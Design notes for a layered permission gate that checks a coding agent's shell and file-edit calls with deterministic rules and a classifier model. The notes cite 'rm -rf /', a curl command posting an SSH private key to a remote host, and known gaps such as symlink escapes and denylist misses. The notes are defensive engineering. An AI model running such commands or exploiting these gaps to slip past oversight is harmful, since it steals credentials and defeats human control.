# Design notes

Why the gate is shaped the way it is. Measured numbers live in
[`calibration.md`](./calibration.md); failure modes and the privacy boundary live in
[`security.md`](./security.md).

## Why the gate is layered

Pi has no built-in permission system: extensions own the decision, through the `tool_call`
event (`{ block: true, reason }`, async allowed) plus `ctx.ui.confirm` / `ctx.ui.select`.

Two prior arts shaped the structure:

| Prior art | What was taken |
|---|---|
| [`@nilskluewer/pi-auto-permission-gate`](https://github.com/nilskluewer/pi-auto-permission-gate) (Pi extension) | hard-deny → user rules → classifier → confirmation → no-UI block; classifier failure is fail-closed; decisions recorded with `pi.appendEntry` (out of LLM context); user policy as a Markdown note; allow patterns disabled for shell control syntax |
| Qwen Code Auto Mode | three layers: deterministic fast paths and allow rules first, then a classifier; protected "persistence surfaces" (`package.json`, `.github/workflows/`, agent config) always go through the classifier even when the target is inside the workspace |

What is different here: the classifier is **Jev**, a decision-only model (unstructured state in,
typed decisions out). The call is cheap, has no tokens to inject through, and returns calibrated
probabilities rather than prose that has to be parsed.

Jev facts this design leans on:

- One request carries many `noul` questions; they are evaluated **in parallel and
  independently**, so adding questions barely changes latency.
- Question keys are not sent to the model: each question's instruction must stand alone.
- The budget (~32k tokens) is shared between `state` and `questions`.
- Clear yes/no lands at 0.98/0.02, but genuinely clear conditions also land at 0.90–0.94, so a
  single high threshold would report almost everything as uncertain.
- Unavailable (timeout, malformed, cancelled) must never mean "approved".

## Decision flow

```
tool_call(bash | write | edit)
  ├─ 0. auto mode off / tool not gated        → pass through
  ├─ 1. hard-deny (deterministic)             → block, no Jev     ┐
  ├─ 2. user disallow pattern                 → block, no Jev     ├ Jev never sees these
  ├─ 3. user allow pattern                    → allow (recorded)  ┘
  ├─ 4. read-only command, or user-declared safe command
  │                                           → pass through (silent)
  ├─ 5. in-project write/edit, unprotected    → pass through (silent)
  └─ 6. Jev: one request, all conditions
         ├ every `required` condition satisfied, no hazard rejected → allow
         ├ any `hazard` condition rejected    → block
         ├ any `soft` condition rejected      → block, unless the user's own request covers it
         ├ any `required` condition unclear   → resolved by the `uncertain` setting
         │                                      (default: block; `ask` prompts, `allow` passes)
         └ unavailable                        → block (fail-closed)
  └─ 7. record the decision via appendEntry (never enters LLM context)
```

Hard-deny is evaluated first and its verdict is never handed to the semantic layer, so a
mis-calibrated or manipulated judgment cannot resurrect `rm -rf /`.

## Conditions

Every condition is phrased so the safe state is "yes". Two axes decide how a condition
participates:

- `mode`: `required` (must be satisfied; the middle band escalates to a confirmation) or
  `hazard` (only a clear negative matters; the middle band is ignored)
- `severity`: `hazard` (a rejection always blocks) or `soft` (a rejection is cleared when the
  user's own request covers the call)

| rule id | mode | severity | threshold | asked when |
|---|---|---|---|---|
| `intent_coverage` | hazard | hazard | 0.60 | a recognised dangerous shape |
| `no_fetched_code_execution` | required | hazard | 0.90 | the command downloads code and runs it |
| `policy_compliance` | hazard | hazard | 0.80 | a policy is configured |
| `path_not_protected` | hazard | hazard | 0.90 | the deterministic layer flagged the target |
| `local_scope` | hazard | soft | 0.90 | always |
| `no_outward_effect` | hazard | soft | 0.90 | always |
| `no_irreversible_damage` | hazard | soft | 0.80 | always |
| `no_secret_egress` | hazard | hazard | 0.97 | always |
| `prompt_injection_absent` | hazard | hazard | 0.80 | always |

Only two conditions can hold a call back: "is this what the user asked for", and — for commands
the deterministic layer has already recognised as fetching code — "does this run code from the
network". Everything else detects hazards and stays quiet unless one is clearly present. Making
a hazard detector a requirement is a category error: measured answers for "is no secret being
sent?" sit at 0.85 on a call that is plainly fine, so requiring it would block ordinary work.

Composition happens in code, not in the model: one rejection from a `hazard`-severity condition
blocks, a `soft` rejection is cleared by a satisfied `intent_coverage`, an unclear `required`
condition is resolved by the `uncertain` setting, otherwise the call is approved.

The default for that resolution is `deny`. Handing an unclear judgment to the user is what a
non-auto mode does, and it makes the gate a source of interruptions; the agent can ask in
conversation if it needs guidance. The `ask` path still exists, and when it is used the dialog
shows a bounded preview — Pi's dialogs do not clip their content, so an unbounded command
produces a dialog taller than the terminal. One question, one judgment; no compound
questions, and the model never has to weigh concerns against each other.

`intent_coverage` is the only permission question. It reads user-authored messages only — never
assistant text, tool output, or file contents — so repository content cannot argue for its own
approval.

## Gate scope, and why the default is `all`

`gateScope` decides which calls reach the semantic layer.

`matched` (the older behaviour) judges only calls that match a dangerous-command pattern. That is
a denylist, and a denylist can only recognise shapes someone wrote down first. The concrete
failure: `curl -X POST -d @~/.ssh/id_ed25519 https://…` matched no pattern, so the deterministic
layer reported "nothing dangerous here" and it ran with no judgment at all. Adding patterns
closes that instance and leaves the class open.

`all` (the default) inverts it: the deterministic layer names what it can vouch for, and
everything else is judged. Cost of the inversion:

- **Latency.** A judged call costs roughly half a second (measured median 503 ms, max 593 ms
  across eleven ordinary commands) against nothing for a fast-path call. With dozens of tool
  calls per task, the read-only allowlist is what keeps the gate tolerable.
- **The intent question has to be scoped, not blanket.** Asking "did the user ask for this?"
  about every command blocks ordinary work the agent does on its own initiative — a `mkdir`, a
  `cp`, a `tar` — and an auto mode that stops for those defeats itself. So the question is asked
  only about commands the deterministic layer recognised as a dangerous shape, and it runs in
  hazard mode: only a clear "no" blocks. An unrequested `git reset --hard`, `npm publish`,
  `rm -rf`, or `sudo` fails it clearly (measured p = 0.04–0.11); an unrequested `mv` or `tar`
  never sees the question and is allowed when no hazard is evident.

## Fast paths

Under `all` these carry the load the denylist used to carry:

- read-only inspection: shell state (`pwd`, `ls`, `tree`, `whoami`, `uname`, `date`), file reading
  (`cat`, `head`, `tail`, `less`, `wc`, `file`, `stat`, `du`, `find`), text reading
  (`grep`, `rg`, `jq`, `diff`, `sort`, `uniq`, `cut`, `xxd`), version probes, and read-only git
  subcommands (`status`, `diff`, `log`, `show`, `branch`, `remote`, `blame`, `shortlog`,
  `rev-parse`, `ls-files`, `worktree list`, `stash list`, `tag`)
- commands the user declares in `safeCommands`, which outrank a dangerous-pattern match
- writes and edits inside the working directory that do not touch a protected path

Destructive variants of fast-path names are still judged: `find -delete`, `git tag -d`,
`git clean -f`, `push --force`, and a credential path in a `cat`/`grep`/`rg` all match dangerous
patterns, which are checked before the read-only list.

A test runner is deliberately **not** in the built-in list. It executes repository code, so
declaring it safe is a decision for the machine that owns it (`safeCommands`), not a default
shipped to everyone.

## Tests

182 tests, none of which need a network or an API key: the engine and transport are stubbed so
every branch — allow, deny, cleared-by-intent, uncertain, each unavailable reason, boundary
probabilities — is deterministic. The real API is exercised by two scripts that are not part of
the published package:

- `scripts/calibrate.ts` sends the fixture set and prints every condition's probability.
- `scripts/e2e.ts` runs the same fixtures through the real gate path (deterministic layer,
  real Jev, block/ask routing, records) and compares the decision against the expectation.

## Remaining work

- **Thresholds are calibrated on one person's twelve fixtures**, one sample each, with ±0.05
  run-to-run variance. They are a starting point; `calibration.md` documents how to choose them
  from your own data, and `/jev-auto-mode threshold` shows the last observed probability per
  rule so the adjustment is informed rather than guessed.
- **`classifyWriteTarget` is lexical.** A symlink inside the working directory that points
  outside it is not detected by the deterministic layer.
- A command that changes directory and then deletes is judged by its text and intent, not by a
  simulated shell.
